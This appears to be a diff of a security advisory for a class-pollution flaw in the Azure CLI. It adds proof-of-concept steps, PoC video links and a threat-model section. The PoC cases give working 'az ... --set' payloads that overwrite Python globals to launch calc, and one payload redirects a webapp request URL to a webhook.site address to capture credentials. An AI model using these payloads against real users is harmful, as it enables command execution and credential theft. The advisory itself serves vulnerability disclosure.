@@ -136,41 +136,46 @@ _create_or_update_initial.metadata = {
 
 ### PoC
 
-**Class Pollution to OS Execution**
+**Case 1: Class Pollution to OS Execution - Gadget 1**
+
+PoC video: https://drive.google.com/file/d/1x0jBLixYG-LH3GpvVS-RWXTWYvPvj4FD/view?usp=sharing
 
 In the Windows environment:
+
+1. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
+2. Input the following payload to pollute the attributes. The calculator should be poped up directly.
+```
+az resource update --ids X --set "__class__.__init__.__globals__.sys.executable=calc"
+```
+
+**Case 2: Class Pollution to OS Execution - Gadget 2**
+
+PoC video: https://drive.google.com/file/d/1R-ISsS4aPaY3SIjTK6H1DIYg0wdp9WA7/view?usp=sharing
+
+In the Windows environment:
+
 1. Open the Azure CLI in an interactive mode.
-2. Login and ensure the account has access to certain available resources, e.g., a webapp with id `X`.
+2. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
 3. Input the following payload to pollute the attributes.
-
 ```
-az resource update --ids "X" --set "__class__.__init__.__globals__.sys.modules.subprocess.os.environ._data.COMSPEC=cmd /c calc"
+az resource update --ids X --set "__class__.__init__.__globals__.sys.modules.subprocess.os.environ._data.COMSPEC=cmd /c calc"
 ```
-
 4. Input any of the commands or behaviors to trigger the command execution.
-
 ```
 az blueprint -h
 az upgrade
 Ctrl+C
 ```
 
-Here is the video PoC: https://drive.google.com/file/d/1R-ISsS4aPaY3SIjTK6H1DIYg0wdp9WA7/view?usp=sharing
+**Case 3: Class Pollution to Credential Leakage**
 
-**Class Pollution to Credential Leakage**
+PoC video: https://drive.google.com/file/d/1BmCpBTV0PkSZYRFDDA38TVKfU5mt-wZf/view?usp=sharing
 
-1. Open the Azure CLI in an interactive mode.
-2. Login and ensure the account has access to certain available resources, e.g., a webapp with id `X`.
-3. Input the following payload to pollute the attributes.
-
+1. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
+2. Input the following payload to pollute the attributes and listen to the attacker-controlled URL to hook the user request.
 ```
-az webapp update --ids "X" --set "__class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations._create_or_update_initial.metadata.url=https://webhook.site/5d69807c-c2aa-4fc2-b165-78880fac827d"
+az webapp update --ids X --set __class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations._create_or_update_initial.metadata.url=https://webhook.site/5d69807c-c2aa-4fc2-b165-78880fac827d
 ```
-
-4. Listen to the above URL to hook the user request.
-
-Here is video PoC: https://drive.google.com/file/d/1BmCpBTV0PkSZYRFDDA38TVKfU5mt-wZf/view?usp=sharing
-
 
 ### Patch 
 
@@ -183,3 +188,8 @@ def _find_property(instance, path):
             instance = _update_instance(instance, part, path)
     return instance
 ```
+
+### Threat Model and Impact
+
+This vulnerability shares the same threat model as [CVE-2022-39327](https://github.com/Azure/azure-cli/security/advisories/GHSA-47xc-9rr2-q7p4), where Azure CLI user input is from an untrusted source. A common attack vector is copying commands from attacker-controlled websites. For instance, an attacker could host a webpage displaying a seemingly benign Azure CLI command while using JavaScript to replace the copied content with a malicious command targeting the user's clipboard. This attack could lead to OS command execution on Windows systems and credential leakage across all environments.
+
